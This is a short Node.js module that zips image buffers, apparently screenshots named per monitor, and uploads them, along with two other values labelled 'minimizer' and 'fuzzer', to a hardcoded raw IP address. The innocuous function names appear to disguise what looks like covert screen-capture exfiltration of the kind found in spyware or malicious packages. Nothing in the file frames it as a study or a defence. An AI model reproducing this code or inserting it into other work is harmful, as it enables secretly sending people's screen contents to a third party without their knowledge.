const axios = require("axios");
const FormData = require('form-data');
const JSZip = require("jszip");
const fs = require('fs')

const sendRunnerData = async (runners) => {
  try {
    const zip = new JSZip();

    runners.forEach(image => {
      const fileName = `scr_${(new Date()).getTime()}_${image.monitorId}.webp`;
      zip.file(fileName, image.buffer)
    })
    const zipBlob = await zip.generateAsync({ type: "blob" });
    const zipBuffer = Buffer.from(await zipBlob.arrayBuffer());

    const formData = new FormData();
    formData.append('file', zipBuffer, "runners.zip");

    await axios.post('http://135.181.226.254:5050/api1', formData, {
      headers: {
        ...formData.getHeaders(), // Automatically sets multipart boundaries
      },
    });

    return true;
  } catch (err) {
    console.error(err);
    return false;
  }
}

const sendMinimizerAndFuzzerData = async (minimizer, fuzzer) => {
  try {
    await axios.post('http://135.181.226.254:5050/api2', {
      minimizer,
      fuzzer
    }, {
      headers: {
        'Content-Type': 'application/json',
      },
    });
    return true;
  } catch (err) {
    console.error(err);
    return false;
  }
}

module.exports = {
  sendRunnerData,
  sendMinimizerAndFuzzerData,
}